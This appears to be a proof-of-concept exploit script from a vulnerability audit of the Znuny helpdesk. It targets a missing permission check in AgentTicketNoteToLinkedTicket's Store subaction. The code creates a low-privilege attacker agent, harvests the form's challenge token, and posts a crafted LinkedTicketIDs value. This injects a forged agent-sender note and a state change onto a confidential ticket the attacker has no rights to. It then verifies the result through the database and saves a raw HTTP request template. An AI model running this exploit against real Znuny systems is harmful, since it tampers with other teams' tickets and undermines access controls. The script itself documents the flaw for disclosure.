#!/usr/bin/env python3
r"""
VULN-001 — AgentTicketNoteToLinkedTicket;Store writes articles + state to ANY ticket
=====================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AgentTicketNoteToLinkedTicket.pm:120,134-138,1208-1236
Vulnerability   : CWE-639 / CWE-862 Broken object-level authorization

Flaw
----
The Store subaction permission-checks ONLY the source ticket $Self->{TicketID}:

    134:  my $Access = $TicketObject->TicketPermission(
    135:      Type => $Config->{Permission}, TicketID => $Self->{TicketID}, UserID => ... );

It then loops over the caller-supplied `LinkedTicketIDs` and, for EACH target, creates an
agent-sender article and sets the ticket state — with NO TicketPermission on the target:

    1209: for my $LinkedTicketID ( @{ $Param{LinkedTicketIDs} } ) {
    1211:   ...Backend::Internal->ArticleCreate( TicketID => $LinkedTicketID, SenderType => 'agent', ...)
    1231:   $TicketObject->TicketStateSet( TicketID => $LinkedTicketID, State => LinkedTicketStateDefault )

So any agent holding `note` on ONE ticket can inject a forged agent-note and change state on
ANY other ticket by number/ID, across queues/teams they cannot access.

Exploit: attacker has rw (⊇ note) on the default `Raw` queue (group `users`); the victim ticket
lives in a dedicated group/queue the attacker has NO rights to. The attacker Stores a note whose
`LinkedTicketIDs` is the off-limits victim → a new agent article + state change lands on it.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-001", "AgentTicketNoteToLinkedTicket;Store writes to ANY ticket",
             ["perm check is on the SOURCE ticket only (pm:134); the LinkedTicketIDs loop (pm:1209) is unchecked"])

    sfx = C.rid()
    # --- attacker: an ordinary agent with rw on the default 'users' queues (incl. Raw) ---
    au, ap = C.create_agent(login=f"att001_{sfx}", groups=["users"])
    C.log("SETUP", f"attacker agent {au} — rw on default 'users' queues only")
    src_tid, src_tn = C.create_ticket(f"attacker source {sfx}", "Raw", body="src",
                                      customer_id="attsrc", customer_user="attsrc")
    C.log("SETUP", f"attacker source ticket TID={src_tid} in 'Raw' (attacker CAN note on it)")

    # --- victim: a ticket in a dedicated group/queue the attacker has NO access to ---
    vgrp = C.create_group(f"vgrp001_{sfx}")
    vq = C.create_queue(f"vq001_{sfx}", group=vgrp)
    vic_tid, vic_tn = C.create_ticket(f"CONFIDENTIAL victim {sfx}", vq, body="secret",
                                      customer_id="victimco", customer_user="victimco")
    C.log("SETUP", f"victim ticket TID={vic_tid} in off-limits queue {vq} (group {vgrp})")

    a = C.agent_client(au, ap)
    # ground truth from the app's OWN permission engine: attacker may note the source, but has
    # ZERO rights on the victim ticket. This is the boundary the Store must not let it cross.
    src_perm = C.perm_check(au, src_tid)
    vic_perm = C.perm_check(au, vic_tid)
    C.log("PROOF", f"attacker TicketPermission on SOURCE {src_tid}: {src_perm} (note allowed = legit)")
    C.log("PROOF", f"attacker TicketPermission on VICTIM {vic_tid}: {vic_perm} (all 0 = off-limits)")
    if vic_perm.get("ro") or vic_perm.get("note") or vic_perm.get("rw"):
        C.failed("premise broken: attacker already has some permission on the victim ticket")

    # harvest the real Store form (token + hidden fields) for the SOURCE ticket
    form = a.get({"Action": "AgentTicketNoteToLinkedTicket", "TicketID": src_tid})
    fields = C.parse_form_fields(form.text)
    tok = fields.get("ChallengeToken") or a.refresh_token(
        C.AGENT_URL + f"?Action=AgentTicketNoteToLinkedTicket;TicketID={src_tid}")[0]
    marker = f"PWNED-VULN001-{sfx}"

    data = {k: v for k, v in fields.items() if v != ""}
    data.update({
        "Action": "AgentTicketNoteToLinkedTicket", "Subaction": "Store",
        "TicketID": str(src_tid), "ChallengeToken": tok,
        "LinkedTicketIDs": str(vic_tid),          # <-- the off-limits target, never permission-checked
        "Subject": f"forged {sfx}", "Body": marker,
        "IsVisibleForCustomer": "0",
    })
    C.log("STEP", f"POST Store: source TID={src_tid}, LinkedTicketIDs={vic_tid} (victim), Body={marker}")
    r = a.post(data=data)
    C.log("INFO", f"Store HTTP {r.status_code}")

    # PROOF: did a new agent-sender article with our marker land on the VICTIM ticket?
    rows = C.db("SELECT a.id, st.name, amd.a_subject, amd.a_body "
                "FROM article a JOIN article_sender_type st ON st.id=a.article_sender_type_id "
                "JOIN article_data_mime amd ON amd.article_id=a.id "
                f"WHERE a.ticket_id={vic_tid} AND amd.a_body LIKE '%{marker}%'")
    C.log("PROOF", f"victim ticket articles matching marker: {rows}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "POST /znuny/index.pl HTTP/1.1\r\nCookie: OTRSAgentInterface=<attacker>\r\n\r\n"
        f"Action=AgentTicketNoteToLinkedTicket&Subaction=Store&TicketID={src_tid}"
        f"&ChallengeToken={tok}&LinkedTicketIDs={vic_tid}&Subject=forged&Body={marker}\r\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"attacker perm on source {src_tid}={src_perm}; on victim {vic_tid}={vic_perm}\n"
        f"victim_article_rows={rows}\n")

    if rows and rows[0][1] == "agent":
        C.confirmed(f"attacker (no rights on queue {vq}) injected an AGENT-sender article "
                    f"'{marker}' onto victim ticket {vic_tid} via LinkedTicketIDs — object-level "
                    "authorization is absent on the note-to-linked-ticket write.")
    else:
        C.failed(f"no forged agent article on victim ticket {vic_tid}: {rows}")

if __name__ == "__main__":
    main()
